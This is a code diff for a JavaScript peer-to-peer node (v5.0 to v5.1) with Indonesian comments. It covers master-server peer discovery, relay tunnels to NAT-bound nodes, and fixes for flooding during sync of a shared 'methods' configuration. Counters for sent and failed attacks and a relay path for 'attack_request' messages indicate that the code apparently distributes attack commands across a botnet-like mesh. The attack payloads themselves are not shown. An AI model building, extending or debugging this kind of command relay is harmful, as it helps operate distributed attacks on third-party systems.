@@ -11,16 +11,17 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 // ============================================================
-// UPGRADE v5.0: Full DIRECT + REVERSE P2P Support
+// UPGRADE v5.1: Fix method sync flooding
 //
-// Key improvements:
-// 1. REVERSE nodes connect OUT to DIRECT peers (not wait for inbound)
-// 2. Master used as signaling/rendezvous server for discovery
-// 3. DIRECT nodes maintain persistent relay for REVERSE nodes
-// 4. Tunnel multiplexing: REVERSE↔DIRECT↔REVERSE bridging
-// 5. Heartbeat-based keep-alive for all connection types
-// 6. Auto-reconnect with exponential backoff for both modes
-// 7. Capability negotiation on handshake (mode, relay, tunnel)
+// Changes from v5.0:
+// 1. handleMethodsVersionResponse: add _pendingMethodsRequestVersion guard
+//    to prevent duplicate requests when multiple peers report same new version
+// 2. handleMethodsUpdateNotification: early-exit if version already matches ours
+//    to prevent unnecessary sync cascade
+// 3. propagateMethodsUpdateImmediate: skip peers already on current version
+//    AND track in-flight propagation per version to prevent re-entry flood
+// 4. sendMethodsConfigToPeer: skip push if peer already has this version
+// 5. startMethodSyncChecker: deduplicated version check before requesting sync
 // ============================================================
 
 class P2PHybridNode extends EventEmitter {
@@ -42,24 +43,27 @@ class P2PHybridNode extends EventEmitter {
     this.peerBlacklist = new Map();   // nodeId -> {reason, until}
 
     // --- REVERSE support ---
-    // reversePeers: REVERSE nodes that have "registered" with this DIRECT node
-    // so we can relay messages to them. Key = nodeId, value = ws socket
     this.reversePeers = new Map();
-
-    // pendingRelayRequests: for REVERSE node waiting for DIRECT to reach target
-    this.pendingRelayRequests = new Map(); // requestId -> {resolve, reject, timeout}
+    this.pendingRelayRequests = new Map();
 
     // --- Referral system ---
     this.receivedReferrals = new Map();
     this.referralTimestamps = new Map();
 
+    // --- Permanent failure lock ---
+    // Peer yang gagal konek >= maxConnectionAttempts kali dikunci PERMANEN.
+    // Lock TIDAK punya TTL — hanya dibuka saat peer itu sendiri datang konek inbound ke kita.
+    // Map: nodeId -> { lockedAt, lockedAtISO, attempts, reason }
+    this.permanentFailureLocks = new Map();
+
+    // Track jumlah kegagalan outbound per peer (akumulasi, reset saat koneksi berhasil)
+    // Map: nodeId -> failureCount
+    this._outboundFailureCounts = new Map();
+
     // --- Message queue ---
-    this.messageQueue = new Map(); // nodeId -> [{message, timestamp}]
+    this.messageQueue = new Map();
 
     // --- REVERSE peer registry ---
-    // knownReversePeers: map of reverseNodeId -> relayNodeId (DIRECT yang jadi relay-nya)
-    // Diisi saat DIRECT node broadcast peer_reverse_list ke peers-nya
-    // Dipakai oleh sendViaTunnel untuk tahu via DIRECT mana harus tunnel
     this.knownReversePeers = new Map();
 
     // --- Methods versioning ---
@@ -67,10 +71,17 @@ class P2PHybridNode extends EventEmitter {
     this.methodsLastUpdate = Date.now();
     this.methodUpdatePropagationLock = new Map();
 
+    // FIX: Guard to prevent duplicate methods requests for the same version
+    // when multiple peers simultaneously report a newer version
+    this._pendingMethodsRequestVersion = null;
+
+    // FIX: Track which versions we've already fully propagated to avoid re-flood
+    this._propagatedVersions = new Map(); // versionHash -> timestamp
+
     // --- File cache ---
     this.fileCache = new Map();
 
-    // --- WebSocket server (for incoming connections) ---
+    // --- WebSocket server ---
     this.wss = null;
     this.isServerReady = false;
 
@@ -78,7 +89,7 @@ class P2PHybridNode extends EventEmitter {
     this.stats = {
       directConnections: 0,
       relayedConnections: 0,
-      reverseNodeConnections: 0,     // NEW: REVERSE nodes that connected to us
+      reverseNodeConnections: 0,
       messagesReceived: 0,
       messagesSent: 0,
       messagesQueued: 0,
@@ -105,10 +116,17 @@ class P2PHybridNode extends EventEmitter {
       plainMessagesReceived: 0,
       broadcastAttacksSent: 0,
       broadcastAttacksFailed: 0,
-      tunnelMessagesForwarded: 0,    // messages forwarded via tunnel
-      reverseHandshakes: 0,          // successful reverse handshakes
-      tunnelAttacksSent: 0,          // attack requests sent via tunnel
-      reverseListBroadcasts: 0,      // peer_reverse_list broadcasts sent
+      tunnelMessagesForwarded: 0,
+      reverseHandshakes: 0,
+      tunnelAttacksSent: 0,
+      reverseListBroadcasts: 0,
+      // FIX: Track skipped syncs for observability
+      methodSyncSkippedUpToDate: 0,
+      methodSyncSkippedDuplicate: 0,
+      // Jumlah peer yang dikunci permanen karena gagal konek >= maxConnectionAttempts
+      permanentLocksTotal: 0,
+      // Jumlah lock permanen yang di-unlock karena peer itu minta join inbound
+      permanentLockUnlockedByInbound: 0,
     };
 
     // --- P2P config ---
@@ -135,13 +153,12 @@ class P2PHybridNode extends EventEmitter {
       maxPropagationHops: 5,
       propagationCooldown: 10000,
 
-      // NEW: REVERSE mode P2P config
-      reverseP2PEnabled: true,           // REVERSE nodes also do P2P
-      reverseReconnectInterval: 30000,   // How often REVERSE tries to reconnect to known DIRECT peers
-      reverseHeartbeatInterval: 45000,   // REVERSE→DIRECT keep-alive interval
-      reverseRegistrationTimeout: 15000, // Timeout for REVERSE to register with DIRECT
-      masterSignalingEnabled: true,      // Use master as signaling server
-      masterSignalingInterval: 90000,    // Poll master for new peers every 90s
+      reverseP2PEnabled: true,
+      reverseReconnectInterval: 30000,
+      reverseHeartbeatInterval: 45000,
+      reverseRegistrationTimeout: 15000,
+      masterSignalingEnabled: true,
+      masterSignalingInterval: 90000,
     };
 
     // --- Intervals ---
@@ -151,18 +168,24 @@ class P2PHybridNode extends EventEmitter {
     this.autoConnectInterval = null;
     this.methodSyncInterval = null;
     this.handlerCleanupInterval = null;
-    this.reverseReconnectInterval = null;  // NEW
-    this.masterSignalingInterval = null;   // NEW
+    this.reverseReconnectInterval = null;
+    this.masterSignalingInterval = null;
 
     this.isShuttingDown = false;
 
-    // --- Request handler registry (for promise-based request/response) ---
+    // --- Request handler registry ---
     this.requestHandlers = new Map();
     this.requestHandlerTimestamps = new Map();
 
     // --- Master connectivity ---
     this.masterReachable = false;
     this.lastMasterCheck = null;
+
+    // FIX: Initialize nodeReachable here — previously only set externally via
+    // index.js (p2pNode.nodeReachable = ...) without an initial value, causing
+    // getStatus() to return undefined for this field.
+    this.nodeReachable = false;
+    this.nodeReachableLastChecked = null;
 
     // --- Encryption ---
     this.encryptionManager = null;
@@ -186,7 +209,7 @@ class P2PHybridNode extends EventEmitter {
       }
     }
 
-    console.log('[P2P] P2P Hybrid Node initialized (v5.0 DIRECT+REVERSE)', {
+    console.log('[P2P] P2P Hybrid Node initialized (v5.1 DIRECT+REVERSE)', {
       nodeId: this.nodeId,
       enabled: this.p2pConfig.enabled,
       maxPeers: this.p2pConfig.maxPeers,
@@ -260,8 +283,13 @@ class P2PHybridNode extends EventEmitter {
   // ==========================================================
 
   setNodeMode(mode) {
+    if (mode !== this.nodeMode) {
+      console.log(`[P2P] Node mode changing: ${this.nodeMode} → ${mode}`);
+    }
     this.nodeMode = mode;
-    console.log(`[P2P] Node mode set to: ${mode}`);
+
+    // FIX: Keep config.NODE.MODE in sync so heartbeat.js getNodeMode() agrees
+    if (this.config.NODE) this.config.NODE.MODE = mode;
 
     if (mode === 'REVERSE' && this.isServerReady) {
       const delayMs = this.p2pConfig.masterSignalingEnabled ? 6000 : 500;
@@ -272,6 +300,25 @@ class P2PHybridNode extends EventEmitter {
         }
       }, delayMs);
     }
+  }
+
+  // FIX: Expose a setter for nodeReachable so index.js can call setNodeReachable()
+  // instead of directly setting p2pNode.nodeReachable = ..., ensuring the timestamp
+  // and any future logic are properly maintained.
+  setNodeReachable(reachable) {
+    if (reachable !== this.nodeReachable) {
+      console.log(`[P2P] Node reachable: ${this.nodeReachable} → ${reachable}`);
+    }
+    this.nodeReachable = !!reachable;
+    this.nodeReachableLastChecked = Date.now();
+  }
+
+  setMasterReachable(reachable) {
+    if (reachable !== this.masterReachable) {
+      console.log(`[P2P] Master reachable: ${this.masterReachable} → ${reachable}`);
+    }
+    this.masterReachable = !!reachable;
+    this.lastMasterCheck = Date.now();
   }
 
   // ==========================================================
@@ -352,18 +399,13 @@ class P2PHybridNode extends EventEmitter {
 
       await this.checkMasterConnectivity();
 
-      // Start all background tasks
-      // Master signaling DULU (3s) supaya knownPeers terisi sebelum autoConnector
       setTimeout(() => this.startMasterSignaling(), 3000);
       setTimeout(() => this.startPeerCleanup(), 5000);
       setTimeout(() => this.startPeerHeartbeat(), 4000);
       setTimeout(() => this.startHandlerCleanup(), 6000);
-      // autoConnector jalan setelah signaling punya waktu populate knownPeers
       setTimeout(() => this.startAutoConnector(), 12000);
       setTimeout(() => this.startMethodSyncChecker(), 30000);
-      // startReverseReconnect: aktif di semua mode, no-op jika bukan REVERSE
       setTimeout(() => this.startReverseReconnect(), 8000);
-      // startPeerDiscovery digantikan startMasterSignaling yang lebih lengkap
 
       console.log('[P2P-SERVER] Background tasks scheduled');
       return true;
@@ -376,9 +418,7 @@ class P2PHybridNode extends EventEmitter {
   }
 
   // ==========================================================
-  // NEW: MASTER SIGNALING
-  // Pull peer list from master periodically (both DIRECT & REVERSE)
-  // This is the primary way REVERSE nodes discover DIRECT peers
+  // MASTER SIGNALING
   // ==========================================================
 
   startMasterSignaling() {
@@ -391,7 +431,6 @@ class P2PHybridNode extends EventEmitter {
 
     console.log(`[P2P-SIGNAL] Master signaling started (every ${this.p2pConfig.masterSignalingInterval}ms)`);
 
-    // Run immediately
     this._doMasterSignaling();
 
     this.masterSignalingInterval = setInterval(() => {
@@ -434,17 +473,11 @@ class P2PHybridNode extends EventEmitter {
         if (!node.node_id || node.node_id === this.nodeId) continue;
 
         const normalizedPort = this.normalizePort(node.port);
-        // FIX: operator precedence bug — gunakan parentheses agar OR dievaluasi dulu
-        // node.mode bisa 'DIRECT'/'REVERSE', fallback ke connection_type check
         const nodeMode = node.mode
           ? node.mode
           : (node.connection_type === 'websocket' ? 'REVERSE' : 'DIRECT');
 
-        // For DIRECT nodes: store as potential P2P peers
-        // For REVERSE nodes: they cannot accept inbound, skip direct connect
         if (nodeMode === 'REVERSE') {
-          // REVERSE nodes can only be reached if THEY connect to us
-          // Just record them in knownPeers for reference
           const existing = this.knownPeers.get(node.node_id);
           if (!existing) {
             newPeers++;
@@ -454,15 +487,14 @@ class P2PHybridNode extends EventEmitter {
             ip: node.ip || null,
             port: normalizedPort,
             mode: 'REVERSE',
-            reachable: false,    // REVERSE nodes are NOT directly reachable
-            canConnectTo: false, // We cannot connect TO a REVERSE node
+            reachable: false,
+            canConnectTo: false,
             capabilities: null,
             methodsVersion: node.methods_version || null,
             methodsCount: node.methods_count || 0,
             lastUpdate: now
           });
         } else {
-          // DIRECT node — we can connect to it
           const existing = this.knownPeers.get(node.node_id);
           if (!existing) {
             newPeers++;
@@ -496,7 +528,6 @@ class P2PHybridNode extends EventEmitter {
         console.log('[P2P-SIGNAL] ⚠ Master returned empty nodes list — check /api/nodes endpoint');
       }
 
-      // Jika kita REVERSE node, connect keluar ke DIRECT peers yang baru ditemukan
       if (this.nodeMode === 'REVERSE') {
         if (directCount > 0) {
           this._scheduleReverseOutboundConnect();
@@ -506,7 +537,6 @@ class P2PHybridNode extends EventEmitter {
       }
 
     } catch (error) {
-      // Don't log AbortError noisily
       if (error.name !== 'AbortError') {
         console.log('[P2P-SIGNAL] Master signaling error:', error.message);
       }
@@ -515,15 +545,13 @@ class P2PHybridNode extends EventEmitter {
   }
 
   // ==========================================================
-  // NEW: REVERSE NODE OUTBOUND CONNECTION
-  // REVERSE nodes actively connect TO DIRECT peers they know about
+  // REVERSE NODE OUTBOUND CONNECTION
   // ==========================================================
 
   _scheduleReverseOutboundConnect() {
     if (this.isShuttingDown) return;
     if (!this.p2pConfig.reverseP2PEnabled) return;
 
-    // Debounce: don't schedule if already scheduled recently
     if (this._reverseConnectScheduled) return;
     this._reverseConnectScheduled = true;
 
@@ -539,7 +567,6 @@ class P2PHybridNode extends EventEmitter {
     const availableSlots = this.p2pConfig.maxPeers - this.peers.size - this.connectionLocks.size;
     if (availableSlots <= 0) return;
 
-    // Find DIRECT peers we know but are not connected to
     const directPeers = Array.from(this.knownPeers.values()).filter(peer => {
       return peer.canConnectTo &&
         peer.mode === 'DIRECT' &&
@@ -548,7 +575,7 @@ class P2PHybridNode extends EventEmitter {
         peer.nodeId !== this.nodeId &&
         !this.peers.has(peer.nodeId) &&
         !this.connectionLocks.has(peer.nodeId) &&
-        !this.isBlacklisted(peer.nodeId);
+        !this.isBlacklisted(peer.nodeId); // isBlacklisted sudah cover permanentFailureLocks
     });
 
     if (directPeers.length === 0) {
@@ -578,7 +605,6 @@ class P2PHybridNode extends EventEmitter {
       } catch (err) {
         console.error(`[P2P-REVERSE-OUT] Error connecting to ${peer.nodeId}:`, err.message);
       }
-      // Small delay between connections
       await new Promise(r => setTimeout(r, 1000));
     }
 
@@ -587,7 +613,6 @@ class P2PHybridNode extends EventEmitter {
     }
   }
 
-  // NEW: Start periodic REVERSE reconnect checker
   startReverseReconnect() {
     if (this.reverseReconnectInterval) clearInterval(this.reverseReconnectInterval);
 
@@ -595,7 +620,6 @@ class P2PHybridNode extends EventEmitter {
       if (this.isShuttingDown) return;
       if (this.nodeMode !== 'REVERSE') return;
 
-      // If we have fewer peers than expected, try to reconnect
       const directPeerCount = Array.from(this.peers.values())
         .filter(p => p.mode === 'DIRECT' || p.remoteMode === 'DIRECT').length;
 
@@ -642,29 +666,32 @@ class P2PHybridNode extends EventEmitter {
       return;
     }
 
-    if (this.isBlacklisted(remoteNodeId)) {
+    // Cek apakah peer ini di-permanent-lock karena sebelumnya gagal outbound
+    // Kalau iya: unlock dulu (peer ini yang datang ke kita = sign bahwa peer aktif)
+    // lalu lanjut proses koneksi seperti biasa
+    if (this.isPermanentlyLocked(remoteNodeId)) {
+      this._unlockPeerByInbound(remoteNodeId);
+      console.log(`[P2P-LOCK] Peer ${remoteNodeId} datang inbound — lock dibuka, koneksi dilanjutkan`);
+    } else if (this.isBlacklisted(remoteNodeId)) {
+      // Temporary blacklist (bukan permanent lock) — tetap tolak
       ws.close(4002, 'Blacklisted');
       return;
     }
 
-    // NEW: Detect if this is a REVERSE node connecting to us (a DIRECT node)
-    // REVERSE nodes connecting to DIRECT create a "reverse tunnel" entry
     const isReverseNode = remoteMode === 'REVERSE';
 
-    // Update known peers
     this.knownPeers.set(remoteNodeId, {
       nodeId: remoteNodeId,
       ip: remoteIp,
       port: remotePort,
       mode: remoteMode,
-      reachable: !isReverseNode, // REVERSE nodes are not directly reachable
+      reachable: !isReverseNode,
       canConnectTo: !isReverseNode,
       capabilities: null,
       methodsVersion: null,
       methodsCount: 0,
       lastUpdate: Date.now(),
       supportsEncryption: remoteEncryption,
-      // NEW: track that this is a REVERSE node connecting to us
       isReverseNode
     });
 
@@ -705,11 +732,11 @@ class P2PHybridNode extends EventEmitter {
       nodeId: remoteNodeId,
       ip: remoteIp,
       port: remotePort,
-      mode: this.nodeMode,      // OUR mode
-      remoteMode: remoteMode,   // THEIR mode — NEW field
+      mode: this.nodeMode,
+      remoteMode: remoteMode,
       connected: true,
       direct: true,
-      isReverseNode,            // NEW
+      isReverseNode,
       lastSeen: now,
       lastHeartbeat: now,
       messagesReceived: 0,
@@ -727,13 +754,10 @@ class P2PHybridNode extends EventEmitter {
     this.connectionLocks.delete(remoteNodeId);
 
     if (isReverseNode) {
-      // Track as reverse node for relay purposes
       this.reversePeers.set(remoteNodeId, ws);
       this.stats.reverseNodeConnections++;
       console.log(`[P2P-SERVER] REVERSE node ${remoteNodeId} connected (will act as relay target)`);
 
-      // Beritahu semua peers lain bahwa ada REVERSE baru di pool kita
-      // Delay sedikit agar welcome exchange selesai dulu
       setTimeout(() => {
         if (!this.isShuttingDown) {
           this.broadcastReverseList();
@@ -744,7 +768,6 @@ class P2PHybridNode extends EventEmitter {
     this.stats.directConnections++;
     this.stats.connectionSuccesses++;
 
-    // Send welcome with full capabilities including relay support
     const welcomeMessage = {
       type: 'welcome',
       nodeId: this.nodeId,
@@ -758,18 +781,17 @@ class P2PHybridNode extends EventEmitter {
         methodsVersion: this.methodsVersionHash,
         methodsCount: Object.keys(this.methodsConfig).length,
         relay: this.p2pConfig.relayFallback && this.masterReachable,
-        tunnel: true,          // NEW: supports tunnel/relay for REVERSE nodes
+        tunnel: true,
         fileSharing: true,
         referrals: true,
-        version: '5.0',
-        nodeMode: this.nodeMode  // NEW: tell peer our mode
+        version: '5.1',
+        nodeMode: this.nodeMode
       }
     };
 
     const encrypted = this.encryptMessage(welcomeMessage, 'welcome');
     this.sendToPeer(remoteNodeId, encrypted.data);
 
-    // Attach message handler
     ws.on('message', (data) => {
       this.handlePeerMessage(remoteNodeId, data);
     });
@@ -811,11 +833,13 @@ class P2PHybridNode extends EventEmitter {
   }
 
   // ==========================================================
-  // OUTBOUND CONNECTION (connectToPeer)
-  // Works for both DIRECT and REVERSE nodes connecting out
+  // OUTBOUND CONNECTION
   // ==========================================================
 
   async connectToPeer(nodeId, peerInfo, retryAttempt = 0) {
+    // retryAttempt: dipakai untuk logging saja.
+    // Jumlah kegagalan sesungguhnya ditrek di this._outboundFailureCounts.
+    // Lock permanen terjadi saat _outboundFailureCounts[nodeId] >= maxConnectionAttempts.
     if (nodeId === this.nodeId) {
       return { success: false, error: 'Cannot connect to self' };
     }
@@ -826,7 +850,6 @@ class P2PHybridNode extends EventEmitter {
       return { success: false, error: 'Cannot connect to self (same IP:port)' };
     }
 
-    // REVERSE nodes cannot be connected TO (they connect out)
     if (peerInfo.mode === 'REVERSE' && peerInfo.canConnectTo === false) {
       return { success: false, error: 'Cannot connect to REVERSE mode node' };
     }
@@ -836,6 +859,10 @@ class P2PHybridNode extends EventEmitter {
     }
 
     if (this.isBlacklisted(nodeId)) {
+      const lockEntry = this.permanentFailureLocks.get(nodeId);
+      if (lockEntry) {
+        return { success: false, error: `Peer permanently locked (${lockEntry.attempts}x gagal sejak ${lockEntry.lockedAtISO})` };
+      }
       return { success: false, error: 'Peer is blacklisted' };
     }
 
@@ -850,11 +877,6 @@ class P2PHybridNode extends EventEmitter {
     const totalConnections = this.peers.size + this.connectionLocks.size;
     if (totalConnections >= this.p2pConfig.maxPeers) {
       return { success: false, error: 'Max peers reached' };
-    }
-
-    if (retryAttempt >= this.p2pConfig.maxConnectionAttempts) {
-      this.blacklistPeer(nodeId, `Max connection attempts (${retryAttempt}) reached`);
-      return { success: false, error: 'Max attempts reached' };
     }
 
     if (!peerInfo.ip || !normalizedPort) {
@@ -877,7 +899,7 @@ class P2PHybridNode extends EventEmitter {
           'X-Node-ID': this.nodeId,
           'X-Node-IP': this.nodeIp || 'unknown',
           'X-Node-Port': this.nodePort.toString(),
-          'X-Node-Mode': this.nodeMode,     // Send OUR mode to the remote
+          'X-Node-Mode': this.nodeMode,
           'X-Encryption': this.isEncryptionEnabled() ? 'enabled' : 'disabled'
         },
         handshakeTimeout: this.p2pConfig.connectionTimeout
@@ -902,12 +924,27 @@ class P2PHybridNode extends EventEmitter {
             return;
           }
 
-          if (retryAttempt < this.p2pConfig.maxConnectionAttempts - 1) {
-            const backoff = this.p2pConfig.connectionBackoffMs * (retryAttempt + 1);
-            console.log(`[P2P] ${baseError}, retrying in ${backoff}ms...`);
+          // Catat kegagalan — kalau sudah >= maxConnectionAttempts, kunci permanen
+          this._recordOutboundFailure(nodeId);
+
+          // Jika sudah terkunci permanen setelah pencatatan, jangan retry
+          if (this.isPermanentlyLocked(nodeId)) {
+            console.log(`[P2P-LOCK] ${nodeId} sudah dikunci permanen, batalkan retry`);
+            finish({ success: false, error: `Permanently locked after ${this._outboundFailureCounts.get(nodeId) || 0} failures` });
+            return;
+          }
+
+          // Masih bisa retry
+          const currentFailures = this._outboundFailureCounts.get(nodeId) || 0;
+          const maxAttempts = this.p2pConfig.maxConnectionAttempts || 3;
+          if (currentFailures < maxAttempts) {
+            const backoff = this.p2pConfig.connectionBackoffMs * currentFailures;
+            console.log(`[P2P] ${baseError} — retry ke-${currentFailures + 1} dalam ${backoff}ms...`);
             finish({ success: false, error: baseError, willRetry: true });
             setTimeout(() => {
-              this.connectToPeer(nodeId, peerInfo, retryAttempt + 1);
+              if (!this.isShuttingDown && !this.isPermanentlyLocked(nodeId)) {
+                this.connectToPeer(nodeId, peerInfo, retryAttempt + 1);
+              }
             }, backoff);
           } else {
             finish({ success: false, error: baseError });
@@ -933,14 +970,12 @@ class P2PHybridNode extends EventEmitter {
 
           const now = Date.now();
 
-          // Attach listeners BEFORE adding to peers map
           ws.on('message', (data) => this.handlePeerMessage(nodeId, data));
 
           ws.on('close', (code, reason) => {
             console.log(`[P2P] Peer ${nodeId} disconnected (code: ${code})`);
             this.handlePeerDisconnected(nodeId, code, reason);
 
-            // NEW: If we are REVERSE, schedule reconnect to this DIRECT peer
             if (this.nodeMode === 'REVERSE' && !this.isShuttingDown) {
               const peerMeta = this.knownPeers.get(nodeId);
               if (peerMeta && peerMeta.canConnectTo) {
@@ -968,11 +1003,11 @@ class P2PHybridNode extends EventEmitter {
             nodeId,
             ip: peerInfo.ip,
             port: normalizedPort,
-            mode: this.nodeMode,          // OUR mode
-            remoteMode: peerInfo.mode || 'DIRECT',  // THEIR mode
+            mode: this.nodeMode,
+            remoteMode: peerInfo.mode || 'DIRECT',
             connected: true,
             direct: true,
-            isOutbound: true,             // NEW: we initiated this connection
+            isOutbound: true,
             lastSeen: now,
             lastHeartbeat: now,
             messagesReceived: 0,
@@ -991,7 +1026,9 @@ class P2PHybridNode extends EventEmitter {
           this.stats.directConnections++;
           this.stats.connectionSuccesses++;
 
-          // NEW: Send our self-welcome with mode info
+          // Reset failure count karena koneksi berhasil
+          this._outboundFailureCounts.delete(nodeId);
+
           const selfWelcome = {
             type: 'welcome',
             nodeId: this.nodeId,
@@ -1008,7 +1045,7 @@ class P2PHybridNode extends EventEmitter {
               tunnel: true,
               fileSharing: true,
               referrals: true,
-              version: '5.0',
+              version: '5.1',
               nodeMode: this.nodeMode
             }
           };
@@ -1123,8 +1160,6 @@ class P2PHybridNode extends EventEmitter {
         case 'peer_list':
           this.handlePeerListUpdate(message);
           break;
-
-        // NEW: Tunnel messages — DIRECT node forwards to target REVERSE node
         case 'tunnel_request':
           this.handleTunnelRequest(nodeId, message, decrypted.encrypted);
           break;
@@ -1132,14 +1167,11 @@ class P2PHybridNode extends EventEmitter {
           this.handleTunnelResponse(nodeId, message);
           break;
         case 'tunnel_delivery':
-          // REVERSE node menerima pesan yang di-tunnel via DIRECT relay
           this.handleTunnelDelivery(nodeId, message);
           break;
         case 'peer_reverse_list':
-          // DIRECT node memberitahu peers-nya siapa saja REVERSE yang terkoneksi
           this.handlePeerReverseList(nodeId, message);
           break;
-
         case 'relay_request':
           this.handleRelayRequest(nodeId, message, decrypted.encrypted);
           break;
@@ -1181,19 +1213,10 @@ class P2PHybridNode extends EventEmitter {
   }
 
   // ==========================================================
-  // NEW: TUNNEL SUPPORT
-  // Enables DIRECT nodes to relay messages TO REVERSE nodes
-  // and back. REVERSE node A -> DIRECT node B -> REVERSE node C
+  // TUNNEL SUPPORT
   // ==========================================================
 
-  /**
-   * Send a message to a target node via tunnel through a DIRECT peer.
-   * Used when target is a REVERSE node that is connected to a DIRECT peer.
-   */
   async sendViaTunnel(targetNodeId, message, messageType = 'tunnel_payload') {
-    // Strategi relay:
-    // 1. Cek knownReversePeers — kita tahu persis DIRECT mana yang punya si target
-    // 2. Fallback: coba semua DIRECT peers kita (trial and error)
     const tunnelId = crypto.randomBytes(8).toString('hex');
 
     const tunnelRequest = {
@@ -1206,7 +1229,6 @@ class P2PHybridNode extends EventEmitter {
       timestamp: Date.now()
     };
 
-    // Strategi 1: kita tahu relay yang tepat
     const knownRelayId = this.knownReversePeers.get(targetNodeId);
     if (knownRelayId && this.peers.has(knownRelayId)) {
       console.log(`[P2P-TUNNEL] Sending to ${targetNodeId} via known relay ${knownRelayId}`);
@@ -1221,7 +1243,6 @@ class P2PHybridNode extends EventEmitter {
       });
     }
 
-    // Strategi 2: coba semua DIRECT peers secara paralel, ambil yang pertama berhasil
     const directPeers = Array.from(this.peers.entries())
       .filter(([, peer]) => peer.remoteMode === 'DIRECT' || (!peer.isReverseNode && peer.supportsTunnel !== false))
       .map(([nodeId]) => nodeId);
@@ -1232,7 +1253,6 @@ class P2PHybridNode extends EventEmitter {
 
     console.log(`[P2P-TUNNEL] Trying ${directPeers.length} DIRECT peer(s) to reach ${targetNodeId}`);
 
-    // Coba satu per satu (bukan paralel — hindari spam)
     for (const relayId of directPeers) {
       const result = await this._requestWithHandler({
         nodeId: relayId,
@@ -1245,7 +1265,6 @@ class P2PHybridNode extends EventEmitter {
       });
 
       if (result && result.success) {
-        // Simpan untuk request berikutnya
         this.knownReversePeers.set(targetNodeId, relayId);
         console.log(`[P2P-TUNNEL] ✓ Found relay: ${relayId} for target ${targetNodeId}`);
         return result;
@@ -1255,21 +1274,15 @@ class P2PHybridNode extends EventEmitter {
     return { success: false, error: `No relay found for ${targetNodeId} (tried ${directPeers.length} peers)` };
   }
 
-  /**
-   * Handle tunnel request: forward payload to target REVERSE node.
-   * This runs on a DIRECT node acting as relay.
-   */
   handleTunnelRequest(fromNodeId, message, wasEncrypted) {
     const { tunnelId, targetNodeId, payload, messageType, sourceNodeId } = message;
 
     console.log(`[P2P-TUNNEL] Tunnel request from ${fromNodeId} to ${targetNodeId} (id: ${tunnelId})`);
 
-    // Check if we have the target REVERSE node connected
     const targetWs = this.reversePeers.get(targetNodeId);
     const targetPeer = this.peers.get(targetNodeId);
 
     if (!targetPeer || !targetWs) {
-      // Target not found in our reverse pool
       const response = {
         type: 'tunnel_response',
         tunnelId,
@@ -1281,7 +1294,6 @@ class P2PHybridNode extends EventEmitter {
       return;
     }
 
-    // Forward the payload to the target REVERSE node
     const forwardedMsg = {
       type: 'tunnel_delivery',
       tunnelId,
@@ -1297,7 +1309,6 @@ class P2PHybridNode extends EventEmitter {
 
     this.stats.tunnelMessagesForwarded++;
 
-    // Acknowledge to sender
     const ackResponse = {
       type: 'tunnel_response',
       tunnelId,
@@ -1316,10 +1327,6 @@ class P2PHybridNode extends EventEmitter {
     this.emit('tunnel_response', { ...message });
   }
 
-  /**
-   * Dipanggil di REVERSE node saat menerima pesan yang di-tunnel via DIRECT.
-   * Pesan ini di-dispatch seolah datang langsung dari sourceNodeId.
-   */
   handleTunnelDelivery(fromRelayId, message) {
     const { tunnelId, sourceNodeId, messageType, payload } = message;
 
@@ -1330,11 +1337,8 @@ class P2PHybridNode extends EventEmitter {
       return;
     }
 
-    // Catat bahwa sourceNodeId bisa dicapai via fromRelayId (untuk balasan)
     this.knownReversePeers.set(sourceNodeId, fromRelayId);
 
-    // Dispatch payload seolah datang langsung dari sourceNodeId
-    // Ini memungkinkan attack_request, methods_request, dll bekerja transparan
     try {
       const fakeData = Buffer.from(JSON.stringify(payload));
       this.handlePeerMessage(sourceNodeId, fakeData);
@@ -1343,10 +1347,6 @@ class P2PHybridNode extends EventEmitter {
     }
   }
 
-  /**
-   * DIRECT node broadcast daftar REVERSE node di pool-nya ke semua peers.
-   * Ini memungkinkan REVERSE-A tahu bahwa REVERSE-B ada di DIRECT-X.
-   */
   handlePeerReverseList(fromNodeId, message) {
     const { reverseNodeIds } = message;
     if (!Array.isArray(reverseNodeIds)) return;
@@ -1357,7 +1357,6 @@ class P2PHybridNode extends EventEmitter {
       if (!this.knownReversePeers.has(reverseId)) {
         newEntries++;
       }
-      // fromNodeId adalah DIRECT relay yang punya reverseId di pool-nya
       this.knownReversePeers.set(reverseId, fromNodeId);
     }
 
@@ -1366,10 +1365,6 @@ class P2PHybridNode extends EventEmitter {
     }
   }
 
-  /**
-   * DIRECT node kirim daftar REVERSE peers-nya ke semua connected peers.
-   * Dipanggil saat ada REVERSE node baru connect, atau periodik.
-   */
   broadcastReverseList() {
     if (this.reversePeers.size === 0) return 0;
 
@@ -1383,7 +1378,6 @@ class P2PHybridNode extends EventEmitter {
 
     let sent = 0;
     for (const [peerId] of this.peers) {
-      // Kirim ke semua peers (DIRECT dan REVERSE) kecuali yang ada di daftar itu sendiri
       if (!reverseNodeIds.includes(peerId)) {
         const enc = this.encryptMessage(message, 'peer_reverse_list');
         if (this.sendToPeer(peerId, enc.data)) sent++;
@@ -1396,7 +1390,7 @@ class P2PHybridNode extends EventEmitter {
   }
 
   // ==========================================================
-  // WELCOME MESSAGE HANDLER (upgraded for mode awareness)
+  // WELCOME MESSAGE HANDLER
   // ==========================================================
 
   handleWelcomeMessage(nodeId, message) {
@@ -1417,7 +1411,7 @@ class P2PHybridNode extends EventEmitter {
       if (message.capabilities) {
         peer.methodsVersion = message.capabilities.methodsVersion;
         peer.methodsCount = message.capabilities.methodsCount || 0;
-        peer.supportsTunnel = message.capabilities.tunnel || false;   // NEW
+        peer.supportsTunnel = message.capabilities.tunnel || false;
       }
 
       const now = Date.now();
@@ -1435,16 +1429,19 @@ class P2PHybridNode extends EventEmitter {
         supportsEncryption: message.capabilities?.encryption || false
       });
 
-      // NEW: If remote is DIRECT and we are REVERSE, mark this as a "relay provider"
       if (peer.remoteMode === 'DIRECT' && this.nodeMode === 'REVERSE') {
         peer.isRelayProvider = true;
         this.stats.reverseHandshakes++;
         console.log(`[P2P] ✓ Established REVERSE→DIRECT link with ${nodeId} (relay provider)`);
       }
 
+      // FIX: Only query version if peer reports a version AND it differs from ours
       if (this.p2pConfig.preferP2PSync && peer.methodsVersion &&
         peer.methodsVersion !== this.methodsVersionHash) {
+        console.log(`[P2P-METHODS] Welcome from ${nodeId} reports different version, querying...`);
         setTimeout(() => this.requestMethodsVersionFromPeer(nodeId), 1000);
+      } else if (peer.methodsVersion === this.methodsVersionHash) {
+        console.log(`[P2P-METHODS] Welcome from ${nodeId}: version matches (${peer.methodsVersion?.substring(0, 8)}), no sync needed`);
       }
     }
 
